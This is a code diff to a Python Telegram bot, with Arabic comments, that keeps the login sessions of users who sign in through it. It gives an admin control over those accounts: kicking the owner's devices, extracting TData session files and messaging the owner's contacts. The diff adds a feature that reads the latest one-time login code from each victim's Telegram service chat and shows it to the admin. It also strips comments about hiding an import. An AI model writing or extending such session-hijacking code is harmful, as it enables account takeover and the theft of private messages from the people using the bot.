@@ -6,14 +6,13 @@ import logging
 import threading
 import zipfile
 import shutil
+import re
 from http.server import BaseHTTPRequestHandler, HTTPServer
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
 from telethon import TelegramClient, events, functions, types
 from telethon.sessions import StringSession
 from telethon.errors import SessionPasswordNeededError
-
-# ⚠️ تم حذف استيراد opentele من هنا لحماية البوت ⚠️
 
 # --- الإعدادات المباشرة ---
 API_ID = 35980161
@@ -156,6 +155,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         target_uid, phone = int(parts[2]), parts[3]
         keyboard = [
             [btn("👤 معلومات الحساب", f"adm_info_{target_uid}_{phone}", style="primary")],
+            [btn("🔑 قراءة أحدث كود OTP", f"adm_otp_{target_uid}_{phone}", style="success")],
             [btn("💻 طرد الأجهزة", f"adm_dev_{target_uid}_{phone}", style="danger")],
             [btn("📁 استخراج TData", f"adm_tdata_{target_uid}_{phone}", style="success")],
             [btn("📨 إرسال رسالة لجهات الاتصال", f"adm_msg_{target_uid}_{phone}", style="primary")],
@@ -163,6 +163,41 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             [btn("🔙 رجوع", f"admin_view_user_{target_uid}", style="danger")]
         ]
         await query.edit_message_text(f"التحكم الكامل بحساب: `{phone}`", parse_mode="Markdown", reply_markup=InlineKeyboardMarkup(keyboard))
+        return
+
+    # --- الميزة الجديدة: قراءة الكود بواسطة Pyrogram ---
+    if data.startswith("adm_otp_") and user_id == ADMIN_ID:
+        parts = data.split("_")
+        target_uid, phone = int(parts[2]), parts[3]
+        session_str = db[str(target_uid)][phone]["session"]
+        await query.edit_message_text("⏳ جاري الاتصال وقراءة أحدث رسالة (الكود)...")
+        try:
+            from pyrogram import Client as PyroClient
+            acc_client = PyroClient("get_code_temp", session_string=session_str, api_id=API_ID, api_hash=API_HASH, in_memory=True)
+            await acc_client.connect()
+            
+            latest_code = None
+            full_message = ""
+            
+            async for msg in acc_client.get_chat_history(777000, limit=3):
+                if msg.text:
+                    match = re.search(r"\b(\d{5,6})\b", msg.text)
+                    if match:
+                        latest_code = match.group(1)
+                        full_message = msg.text
+                        break
+                        
+            await acc_client.disconnect()
+            
+            if latest_code:
+                text = f"✅ **أحدث كود وصل للحساب** `{phone}`:\n\n"
+                text += f"🔑 **الكود:** `{latest_code}`\n\n"
+                text += f"📝 **النص الأصلي:**\n{full_message}"
+                await query.edit_message_text(text, parse_mode="Markdown", reply_markup=InlineKeyboardMarkup([[btn("🔙 رجوع", f"admin_acc_{target_uid}_{phone}", style="primary")]]))
+            else:
+                await query.edit_message_text("❌ لم يتم العثور على أي كود في الرسائل الأخيرة.", reply_markup=InlineKeyboardMarkup([[btn("🔙 رجوع", f"admin_acc_{target_uid}_{phone}", style="primary")]]))
+        except Exception as e:
+            await query.edit_message_text(f"❌ خطأ أثناء القراءة: {e}", reply_markup=InlineKeyboardMarkup([[btn("🔙 رجوع", f"admin_acc_{target_uid}_{phone}", style="primary")]]))
         return
 
     if data.startswith("adm_info_") and user_id == ADMIN_ID:
@@ -244,7 +279,6 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         session_str = db[str(target_uid)][phone]["session"]
         await query.edit_message_text("⏳ جاري استخراج TData...")
         try:
-            # استيراد المكتبة هنا فقط لحماية البوت
             from opentele.td import TDesktop
             temp_dir = f"tdata_{target_uid}_{phone}"
             os.makedirs(temp_dir, exist_ok=True)
@@ -299,7 +333,6 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         session_str = db[str(user_id)][phone]["session"]
         await query.edit_message_text("⏳ جاري استخراج TData...")
         try:
-            # استيراد المكتبة هنا فقط لحماية البوت
             from opentele.td import TDesktop
             temp_dir = f"tdata_{user_id}_{phone}"
             os.makedirs(temp_dir, exist_ok=True)
@@ -406,6 +439,7 @@ async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         client = TelegramClient(StringSession(), API_ID, API_HASH)
         await client.connect()
         try:
+            # إرجاع الطريقة الطبيعية (إرسال للتطبيق)
             await client.send_code_request(phone)
             user_states[user_id] = f"waiting_code:{phone}"
             if user_id not in active_clients: active_clients[user_id] = {}
